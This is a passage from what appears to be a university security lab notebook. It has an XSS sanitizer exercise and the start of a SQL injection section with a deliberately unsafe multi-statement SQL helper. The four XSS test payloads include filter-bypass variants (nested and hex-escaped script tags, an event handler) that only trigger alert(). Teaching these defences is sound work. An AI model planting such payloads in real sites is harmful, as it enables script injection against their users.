      "\u001b[0;32m/usr/local/Cellar/python@3.9/3.9.9/Frameworks/Python.framework/Versions/3.9/lib/python3.9/multiprocessing/process.py\u001b[0m in \u001b[0;36mterminate\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    131\u001b[0m         '''\n\u001b[1;32m    132\u001b[0m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_check_closed\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 133\u001b[0;31m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_popen\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mterminate\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    134\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    135\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mkill\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mAttributeError\u001b[0m: 'NoneType' object has no attribute 'terminate'"
     ]
    }
   ],
   "source": [
    "# Post your comment and refresh the website (http://localhost:5000).\n",
    "web = web_template;\n",
    "web = post(comment);\n",
    "\n",
    "if p:\n",
    "    p.terminate()\n",
    "    p.join()\n",
    "p = Process(target=app.run)\n",
    "p.start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Practice\n",
    "An important defense against XSS attacks is input sanitization. In this lab, we provide several attack scripts, and you will need to implement an sanitizer against them. Note that your sanitizer should allow normal comments to pass."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Implement a sanitizer against the following XSS attack scripts. Note that your sanitizer should make all the malicious input fail but allow the honest input to be posted normally (which means you should not just output an empty string). You should think of the scenario where your sanitizer is used in a real-world website. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "def sanitizer(comment):\n",
    "    ##################\n",
    "    # Your anwser here\n",
    "    \n",
    "    \n",
    "    \n",
    "    ##################\n",
    "    return comment;"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "1. Normal input"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "normal_comment = \"<b>Here is my script.</b> <span>Btw, I don't believe that there are >= 1500 students in CS161!</span>\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "ename": "AttributeError",
     "evalue": "'NoneType' object has no attribute 'terminate'",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mAttributeError\u001b[0m                            Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-12-fe191b1d6c41>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      5\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      6\u001b[0m \u001b[0;32mif\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 7\u001b[0;31m     \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mterminate\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      8\u001b[0m     \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mjoin\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      9\u001b[0m \u001b[0mp\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mProcess\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtarget\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mapp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrun\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python@3.9/3.9.9/Frameworks/Python.framework/Versions/3.9/lib/python3.9/multiprocessing/process.py\u001b[0m in \u001b[0;36mterminate\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    131\u001b[0m         '''\n\u001b[1;32m    132\u001b[0m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_check_closed\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 133\u001b[0;31m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_popen\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mterminate\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    134\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    135\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mkill\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mAttributeError\u001b[0m: 'NoneType' object has no attribute 'terminate'"
     ]
    }
   ],
   "source": [
    "# Post your comment and refresh the website (http://localhost:5000). \n",
    "web = web_template;\n",
    "comment = sanitizer(normal_comment);\n",
    "web = post(comment);\n",
    "\n",
    "if p:\n",
    "    p.terminate()\n",
    "    p.join()\n",
    "p = Process(target=app.run)\n",
    "p.start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "2. XSS attack script A. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "attack_comment = \"<script>alert(\\\"XSS attack!\\\")</script>\" # attack comment"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "ename": "AttributeError",
     "evalue": "'NoneType' object has no attribute 'terminate'",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mAttributeError\u001b[0m                            Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-14-dd40996e6708>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      5\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      6\u001b[0m \u001b[0;32mif\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 7\u001b[0;31m     \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mterminate\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      8\u001b[0m     \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mjoin\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      9\u001b[0m \u001b[0mp\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mProcess\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtarget\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mapp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrun\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python@3.9/3.9.9/Frameworks/Python.framework/Versions/3.9/lib/python3.9/multiprocessing/process.py\u001b[0m in \u001b[0;36mterminate\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    131\u001b[0m         '''\n\u001b[1;32m    132\u001b[0m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_check_closed\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 133\u001b[0;31m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_popen\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mterminate\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    134\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    135\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mkill\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mAttributeError\u001b[0m: 'NoneType' object has no attribute 'terminate'"
     ]
    }
   ],
   "source": [
    "# Post your comment and refresh the website (http://localhost:5000). \n",
    "web = web_template;\n",
    "comment = sanitizer(attack_comment);\n",
    "web = post(comment);\n",
    "\n",
    "if p:\n",
    "    p.terminate()\n",
    "    p.join()\n",
    "p = Process(target=app.run)\n",
    "p.start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "3. XSS attack script B. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "attack_comment = '<scr<script>ipt>alert(\"XSS attack!\")</scr<script>ipt>' # attack comment"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "ename": "AttributeError",
     "evalue": "'NoneType' object has no attribute 'terminate'",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mAttributeError\u001b[0m                            Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-16-dd40996e6708>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      5\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      6\u001b[0m \u001b[0;32mif\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 7\u001b[0;31m     \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mterminate\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      8\u001b[0m     \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mjoin\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      9\u001b[0m \u001b[0mp\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mProcess\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtarget\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mapp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrun\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python@3.9/3.9.9/Frameworks/Python.framework/Versions/3.9/lib/python3.9/multiprocessing/process.py\u001b[0m in \u001b[0;36mterminate\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    131\u001b[0m         '''\n\u001b[1;32m    132\u001b[0m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_check_closed\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 133\u001b[0;31m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_popen\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mterminate\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    134\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    135\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mkill\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mAttributeError\u001b[0m: 'NoneType' object has no attribute 'terminate'"
     ]
    }
   ],
   "source": [
    "# Post your comment and refresh the website (http://localhost:5000). \n",
    "web = web_template;\n",
    "comment = sanitizer(attack_comment);\n",
    "web = post(comment);\n",
    "\n",
    "if p:\n",
    "    p.terminate()\n",
    "    p.join()\n",
    "p = Process(target=app.run)\n",
    "p.start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "4. XSS attack script C. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "attack_comment = '<b onmouseover=alert(\\'Attack!\\')>click me!</b>' # attack comment"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "ename": "AttributeError",
     "evalue": "'NoneType' object has no attribute 'terminate'",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mAttributeError\u001b[0m                            Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-18-89fdddfd616b>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      6\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      7\u001b[0m \u001b[0;32mif\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 8\u001b[0;31m     \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mterminate\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      9\u001b[0m     \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mjoin\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     10\u001b[0m \u001b[0mp\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mProcess\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtarget\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mapp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrun\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python@3.9/3.9.9/Frameworks/Python.framework/Versions/3.9/lib/python3.9/multiprocessing/process.py\u001b[0m in \u001b[0;36mterminate\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    131\u001b[0m         '''\n\u001b[1;32m    132\u001b[0m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_check_closed\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 133\u001b[0;31m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_popen\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mterminate\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    134\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    135\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mkill\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mAttributeError\u001b[0m: 'NoneType' object has no attribute 'terminate'"
     ]
    }
   ],
   "source": [
    "# Post your comment and refresh the website (http://localhost:5000). \n",
    "# To trigger the attack, you need to click the button.\n",
    "web = web_template;\n",
    "comment = sanitizer(attack_comment);\n",
    "web = post(comment);\n",
    "\n",
    "if p:\n",
    "    p.terminate()\n",
    "    p.join()\n",
    "p = Process(target=app.run)\n",
    "p.start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "5. XSS attack script D."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [],
   "source": [
    "attack_comment = '\\x3cscript>alert(\"XSS attack!\")\\x3c/script>' # attack comment"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "ename": "AttributeError",
     "evalue": "'NoneType' object has no attribute 'terminate'",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mAttributeError\u001b[0m                            Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-20-dd40996e6708>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      5\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      6\u001b[0m \u001b[0;32mif\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 7\u001b[0;31m     \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mterminate\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      8\u001b[0m     \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mjoin\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      9\u001b[0m \u001b[0mp\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mProcess\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtarget\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mapp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrun\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python@3.9/3.9.9/Frameworks/Python.framework/Versions/3.9/lib/python3.9/multiprocessing/process.py\u001b[0m in \u001b[0;36mterminate\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    131\u001b[0m         '''\n\u001b[1;32m    132\u001b[0m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_check_closed\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 133\u001b[0;31m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_popen\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mterminate\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    134\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    135\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mkill\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mAttributeError\u001b[0m: 'NoneType' object has no attribute 'terminate'"
     ]
    }
   ],
   "source": [
    "# Post your comment and refresh the website (http://localhost:5000). \n",
    "web = web_template;\n",
    "comment = sanitizer(attack_comment);\n",
    "web = post(comment);\n",
    "\n",
    "if p:\n",
    "    p.terminate()\n",
    "    p.join()\n",
    "p = Process(target=app.run)\n",
    "p.start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Finish\n",
    "Run the following block of code to stop the server once you are finished."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "ename": "AttributeError",
     "evalue": "'NoneType' object has no attribute 'terminate'",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mAttributeError\u001b[0m                            Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-21-2a492b800165>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mterminate\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      2\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mjoin\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python@3.9/3.9.9/Frameworks/Python.framework/Versions/3.9/lib/python3.9/multiprocessing/process.py\u001b[0m in \u001b[0;36mterminate\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    131\u001b[0m         '''\n\u001b[1;32m    132\u001b[0m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_check_closed\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 133\u001b[0;31m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_popen\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mterminate\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    134\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    135\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mkill\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mAttributeError\u001b[0m: 'NoneType' object has no attribute 'terminate'"
     ]
    }
   ],
   "source": [
    "p.terminate()\n",
    "p.join()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Section 2: A Simple SQL Injection Attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In this section, we will learn how to perform a SQL injection attack. SQL injection is a subset of code injection attacks, a class of attacks whose core idea is to convince the server to interpret an input as part of a SQL query. If the application is creating SQL strings by integrating user's input on the fly and then running them, we will see that it's straightforward to inject malicious SQL code. SQL injection attacks allow attackers to spoof one's identity or tamper with existing data.\n",
    "\n",
    "### Setup\n",
    "We first introduce how to build a database in python. <b>Sqlite3</b> is a python module that provides a SQL interface to interact with a lightweight disk-based database. We will use this module to create the database and execute our SQL command."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {
    "deletable": false,
    "editable": false
   },
   "outputs": [],
   "source": [
    "import sqlite3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "To use the module, we must first create a <i>Connection</i> object that represents the database. Usually, the data will be stored in the local file (for example, <mark>example.db</mark>). In this section, we use a special name <mark>:memory:</mark> to create a database in the memory. Once we have establish a <i>Connection</i> for the database, we can create a <i>Cursor</i> object and use it to execute SQL commands to insert data."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Create database\n",
    "# con = sqlite3.connect('example.db')\n",
    "con = sqlite3.connect(':memory:')\n",
    "# Create the Cursor\n",
    "cur = con.cursor()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now we call the <mark>execute()</mark> function to create two tables: the <b>transcripts</b> table that stores the grades of all the students, and the <b>users</b> table that stores passwords of all users. \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<sqlite3.Cursor at 0x11155fc70>"
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Create tables\n",
    "cur.execute('''CREATE TABLE transcripts\n",
    "               (studentID integer, name text, course text, grade text)''')\n",
    "cur.execute('''CREATE TABLE users\n",
    "               (username text, password text)''')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Below, we provide a function to execute multiple SQL commands in a single script. Using this function, we can insert data to both tables."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [],
   "source": [
    "def exe_sql_script(query):\n",
    "    (q1, q2, q3) = query.partition(';');\n",
    "    res = [];\n",
    "    while q2 != '':\n",
    "        print(q1);\n",
    "        try:\n",
    "            for row in cur.execute(q1):\n",
    "                res.append(row)\n",
    "        except:\n",
    "            print(\"Failed to execute the sql script!\")\n",
    "            return []\n",
    "        (q1, q2, q3) = q3.partition(';');\n",
    "    print(q1);\n",
    "    try:\n",
    "        for row in cur.execute(q1):\n",
    "                res.append(row)\n",
    "    except:\n",
    "        print(\"Failed to execute the sql script!\")\n",
    "        return []\n",
    "    return res"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    INSERT INTO transcripts VALUES (1, 'Alice', 'cs161', 'A')\n",
      "\n",
      "    INSERT INTO transcripts VALUES (1, 'Alice', 'cs162', 'A-')\n",
      "\n",
      "    INSERT INTO transcripts VALUES (2, 'Bob', 'cs161', 'A-')\n",
      "\n",
      "    INSERT INTO transcripts VALUES (2, 'Bob', 'cs162', 'A')\n",
      "\n",
      "    INSERT INTO transcripts VALUES (3, 'Carlo', 'cs161', 'B-')\n",
      "\n",
      "    INSERT INTO transcripts VALUES (4, 'David', 'cs161', 'B')\n",
      "\n",
      "    INSERT INTO transcripts VALUES (4, 'David', 'cs61a', 'A')\n",
      "\n",
      "    INSERT INTO transcripts VALUES (5, 'Eve', 'cs161', 'A')\n",
      "\n",
      "    INSERT INTO transcripts VALUES (6, 'Frank', 'cs161', 'A')\n",
      "\n",
      "    INSERT INTO transcripts VALUES (7, 'Gina', 'cs161', 'A-')\n",
      "\n",
      "    INSERT INTO transcripts VALUES (8, 'Harika', 'cs161', 'A')\n",
      "\n",
      "    INSERT INTO transcripts VALUES (8, 'Harika', 'cs61a', 'B')\n",
      "\n",
      "    INSERT INTO transcripts VALUES (9, 'Isabelle', 'cs161', 'B-')\n",
      "\n",
      "    INSERT INTO transcripts VALUES (10, 'Jack', 'cs161', 'B')\n",
      "\n",
      "    INSERT INTO transcripts VALUES (11, 'Kian', 'cs161', 'A')\n",
      "\n",
      "    INSERT INTO transcripts VALUES (11, 'Kian', 'cs61a', 'A-')\n",
      "\n",
      "    INSERT INTO transcripts VALUES (12, 'Lily', 'cs161', 'B')\n",
      "\n",
      "    \n",
      "    INSERT INTO users VALUES ('Nova', '83@Ln^Yck_R@z2x#')\n",
      "\n",
      "    INSERT INTO users VALUES ('manager', 'LbJHaRRm+98tF5P$')\n",
      "\n",
      "    INSERT INTO users VALUES ('admin', 'cLzvCw9kCxYg?AdE')\n",
      "\n",
      "    \n"
     ]
    }
   ],
   "source": [
    "exe_sql_script(\"\"\"\n",
